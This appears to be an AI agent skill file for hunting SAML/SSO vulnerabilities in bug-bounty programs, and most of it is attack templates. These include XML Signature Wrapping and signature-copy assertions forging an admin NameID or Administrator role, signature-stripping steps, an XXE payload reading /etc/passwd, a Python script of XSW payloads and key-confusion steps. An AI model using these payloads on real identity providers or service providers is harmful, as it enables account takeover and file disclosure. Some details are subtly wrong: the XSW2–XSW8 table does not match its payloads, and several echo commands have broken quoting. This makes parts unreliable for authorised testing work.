---
name: hunt-saml
description: "Hunt SAML / SSO attacks. Patterns: XML Signature Wrapping (XSW) — modify Assertion while keeping Signature valid by relocating signed element, comment injection in NameID (admin@target.com<!--evil-->@attacker.com → some parsers see admin@target.com), signature stripping (remove Signature element entirely, server should reject but doesn't), key confusion (signed by attacker's IdP, accepted by SP), audience-restriction not validated, replay attack (same Assertion accepted twice within validity window). Tools: SAML Raider Burp extension, samlmagic, manual XML manipulation. Detection: any /saml endpoint, /Shibboleth.sso, /sso/saml/, Microsoft ADFS endpoints. Validate: account takeover via altered NameID, admin role injection via altered AttributeStatement. Use when hunting SSO flows, when SAML AssertionConsumerService is reachable, when chaining IdP-trust to SP-impersonation."
sources: bug_bounty_reports, offensive_research
report_count: 10
---

## 20. SAML / SSO ATTACKS
> SSO bugs frequently pay High–Critical. XML parsers are notoriously inconsistent.

### Attack Surface
```bash
# Find SAML endpoints
cat recon/$TARGET/urls.txt | grep -iE "saml|sso|login.*redirect|oauth|idp|sp"
# Key endpoints: /saml/acs (assertion consumer service), /sso/saml, /auth/saml/callback
```

### Attack 1: XML Signature Wrapping (XSW)
```xml
<!-- BEFORE: valid assertion by user@company.com -->
<saml:Response>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature><!-- Valid, covers ID=legit --></ds:Signature>
  </saml:Assertion>
</saml:Response>

<!-- AFTER: inject evil assertion. Signature still validates (covers #legit).
     App processes the FIRST assertion found = evil. -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>  <!-- Attacker-controlled -->
  </saml:Assertion>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature><!-- Valid --></ds:Signature>
  </saml:Assertion>
</saml:Response>
```

### Attack 2: Comment Injection in NameID
```xml
<!-- Attacker registers/controls account: admin@company.com.evil.com -->
<NameID>admin@company.com<!---->.evil.com</NameID>
<!-- Signed canonical form (C14N without-comments strips the comment BEFORE
     digest): "admin@company.com.evil.com" — the value the signature covers. -->
<!-- App's XML processor also strips the comment but only reads the text node
     UP TO the comment boundary: "admin@company.com" — a DIFFERENT effective
     identity than was signed. The discrepancy is the bug. -->
<!-- Works when signer's C14N and app's text extraction disagree on comments.
     CVE-2017-11428 (Ruby-SAML / OneLogin), CVE-2016-5697. -->
```

### Attack 3: Signature Stripping
```
1. Decode SAMLResponse: echo "BASE64" | base64 -d | xmllint --format - > saml.xml
2. Delete the entire <Signature> element
3. Change NameID to admin@company.com
4. Re-encode: base64 -w0 saml.xml  (POST binding = raw base64, NO compression; Redirect binding uses raw DEFLATE — not gzip)
5. Submit — if server doesn't verify signature presence = admin ATO
```

### Attack 4: XXE in SAML Assertion
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Assertion>
  <NameID>&xxe;</NameID>
</saml:Assertion>
```

### Attack 5: NameID Manipulation
```
Test these NameID values:
- admin@company.com (generic admin)
- administrator@company.com
- support@target.com
- Any email found in disclosed reports for this program
- ${7*7} (SSTI if NameID gets rendered in a template)
```

### Tools
```bash
# SAMLRaider (Burp extension) — automated XSW testing
# BApp Store → SAMLRaider → intercept SAMLResponse → SAML Raider tab

# Manual workflow:
echo "BASE64_SAML" | base64 -d > saml.xml
# Edit saml.xml
base64 -w0 saml.xml  # Re-encode
# URL-encode the result before sending as SAMLResponse parameter
```

### SAML Triage
```
XSW successful   = Critical (ATO any user)
Sig stripping    = Critical (ATO any user)
Comment injection = High (ATO admin)
XXE in assertion = High (file read / SSRF)
NameID manip     = Medium/High (depends on what NameID maps to)
```

## Attack 6: The Fragile Lock — SAML Bypasses (Fedotkin, Dec 2025)

**Source:** https://portswigger.net/research/the-fragile-lock

The research by Alexander Fedotkin (Dec 2025) reveals entire classes of SAML bypasses rooted in
parser differentials, canonicalization mismatches, and multi-signature confusion. Three key vectors:

### 6a. Parser Differentials
Different XML parsers (libxml2, Xerces, MSXML, System.Xml in .NET) disagree on:
- **XML comment boundaries** — signer uses `C14N without comments`, verifier uses `C14N with comments`,
  or vice versa. The effective signed value differs from the verified value.
- **Whitespace normalization** — `NameID` with trailing spaces, tab-vs-space between attributes,
  namespace prefix expansion (xmlns:prefix vs inherited default namespace).
- **Entity expansion order** — Internal entity vs external entity processing order in the parser
  pipeline can produce a post-parse DOM that differs from the pre-sign-verified canonical form.
- **CDATA section handling** — `<NameID><![CDATA[admin@company.com]]></NameID>` vs
  `<NameID>admin@company.com</NameID>` — some parsers strip CDATA, some keep it.

**Detection script:**
```bash
# Re-encode the same SAML assertion with multiple XML formatting variations.
# If any variation produces a different NameID than what was signed → parser differential.

# Variation 1 — Whitespace in element content
echo "<saml:Assertion ID="legit"><NameID>  admin@company.com  </NameID><ds:Signature>...</ds:Signature></saml:Assertion>" | base64

# Variation 2 — CDATA wrapping
echo "<saml:Assertion ID="legit"><NameID><![CDATA[admin@company.com]]></NameID><ds:Signature>...</ds:Signature></saml:Assertion>" | base64

# Variation 3 — Namespace redeclaration
echo "<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="legit"><NameID>admin@evil.com</NameID><ds:Signature>...</ds:Signature></saml:Assertion>" | base64
```

### 6b. Multi-Signature / Signature Copy
Some SPs accept assertions with MULTIPLE `<ds:Signature>` elements. An attacker can:
1. Obtain a valid signature for ANY assertion (e.g., from a public SAML demo IdP or from a prior login).
2. Strip the original signed assertion, keeping only the `<ds:Signature>`.
3. Wrap a NEW evil assertion with the copied-signature element attached.

```xml
<!-- Attacker copies a valid signature from any previously-seen SAML assertion -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>
    <AttributeStatement>
      <Attribute Name="Role"><AttributeValue>Administrator</AttributeValue></Attribute>
    </AttributeStatement>
  </saml:Assertion>
  <ds:Signature><!-- Copied from another assertion; server verifies it exists, NOT what it covers --></ds:Signature>
</saml:Response>
```

### 6c. New XSW Variants (XSW2–XSW8)
Beyond the classic XSW1 (duplicate assertion injection), these variants circumvent modern SAML
libraries that added position-based or ID-based signature binding:

| Variant | Technique | Bypasses |
|---------|-----------|----------|
| **XSW2** | Move `<ds:Signature>` INSIDE a child element of the evil assertion | Libraries that verify signature position relative to root |
| **XSW3** | Split assertion across XML-comment boundaries in the reference URI | Libraries that use URI-fragment matching |
| **XSW4** | Inject a second `AssertionIDRef` / `AuthnStatement` inside the signed assertion | Libraries that process all statements, not just first |
| **XSW5** | Use `xml:id` / `ID` attribute on the INJECTED assertion matching the signed reference's `URI` | Libraries that match by ID string, not DOM position |
| **XSW6** | Namespace-prefix injection — declare an alias for the SAML namespace so the injected assertion uses a different prefix but same namespace | Libraries that key on prefix string |
| **XSW7** | XML External Entity (XXE) inside the signature-reference URI to poison the digest check | Libraries that resolve entities during signature validation |
| **XSW8** | XSLT transform injection in the `<ds:Transform>` element — transforms the post-signature DOM | Libraries that apply transforms after verification |

**Probing script for XSW2–XSW5:**
```python
# XSW2: Signature inside child element
xsw2_payload = '''<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>
    <ds:Signature><!-- Copied valid signature --></ds:Signature>
  </saml:Assertion>
</saml:Response>'''

# XSW3: Comment-split URI reference
xsw3_payload = '''<saml:Response>
  <saml:Assertion ID="legit"><!-- ID actually referenced by signature URI -->
    ...
  </saml:Assertion>
  <saml:Assertion ID="evil"><!-- Not referenced but processed first -->
    <NameID>admin@company.com</NameID>
  </saml:Assertion>
</saml:Response>'''

# XSW4: Extra statement inside the legit assertion
xsw4_payload = '''<saml:Response>
  <saml:Assertion ID="legit">
    <ds:Signature><!-- Valid --></ds:Signature>
    <saml:AuthnStatement><!-- SP reads this one, overrides original -->
      <saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PreviousSession</saml:AuthnContextClassRef></saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
      <saml:Attribute Name="Role"><saml:AttributeValue>Administrator</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</saml:Response>'''
```

### Triage: Key Confusion Variant
When the SP trusts MULTIPLE IdPs (common in federated environments), an assertion signed by
IdP-A (attacker-controlled IdP) is sent to an SP that trusts IdP-B (victim IdP). If the SP does not
validate `<Issuer>` or `<AudienceRestriction>`, the attacker-IdP-signed assertion grants access.
```bash
# Test key confusion:
# 1. Register as an IdP on a federated platform
# 2. Sign an assertion for admin@company.com with YOUR IdP's private key
# 3. POST to victim SP's AssertionConsumerService
# 4. If SP accepts the assertion without checking Issuer = expected IdP → ATO
```

---

## Related Skills & Chains

- **`hunt-ato`** — SAML XSW with absent audience-restriction validation is the canonical SP-impersonation-of-admin chain. Chain primitive: XSW1 attack relocates signed assertion to a secondary position + injects evil assertion with `NameID=admin@target.com` in primary position + SP processes first assertion (the evil one) + SP doesn't validate `<AudienceRestriction>` so an assertion intended for IdP-A is accepted by SP-B → admin ATO across federated tenant boundary.
- **`hunt-auth-bypass`** — SAML signature-stripping is the textbook auth-bypass pattern; this skill provides the SAML mechanics, hunt-auth-bypass provides the broader bypass-discipline. Chain primitive: capture valid SAMLResponse → regex-strip `<ds:Signature>` element entirely → modify `<NameID>` to admin → re-encode base64 → POST to `/saml/acs` → SP wantAssertionsSigned=false silently accepts → admin session issued without any cryptographic challenge.
- **`hunt-oauth`** — SAML-fronted OAuth issuers turn assertion-level bugs into token-level ATO. Chain primitive: SP issues OAuth bearer tokens after SAML assertion validation + XSW alters NameID to admin → SP's token endpoint issues OAuth token bearing admin claims → all downstream OAuth-scoped APIs (admin API, billing API, user-management API) grant admin access from a single forged assertion.
- **`hunt-xxe`** — SAML assertions ARE XML; XXE in the assertion parser is a separate chain on top of XSW. Chain primitive: SAML parser without `disallow-doctype-decl` + `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` in assertion + `<NameID>&xxe;</NameID>` → SP renders/logs NameID → /etc/passwd contents leak in error response or audit log → file-read primitive on SAML SP infrastructure.
- **`security-arsenal`** — Pull the SAML/XSW Payload Catalog (XSW1-XSW8 templates, comment-injection variants for libxml/Xerces/MSXML parser differences, signature-wrapping with multiple Reference elements, key-confusion payloads where attacker-IdP-signed assertions are accepted by trust-naive SPs) and the always-rejected list for "SAMLResponse accepted on the wrong endpoint" claims that don't actually validate.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on a SAML "vulnerability" that only modifies non-security-relevant attributes (display name, locale) without altering NameID, AuthnContext, or role-bearing AttributeStatements. Theoretical XML manipulation that doesn't cross an authorization boundary is Informational, not Critical — the auth-decision-changing step is the gate.
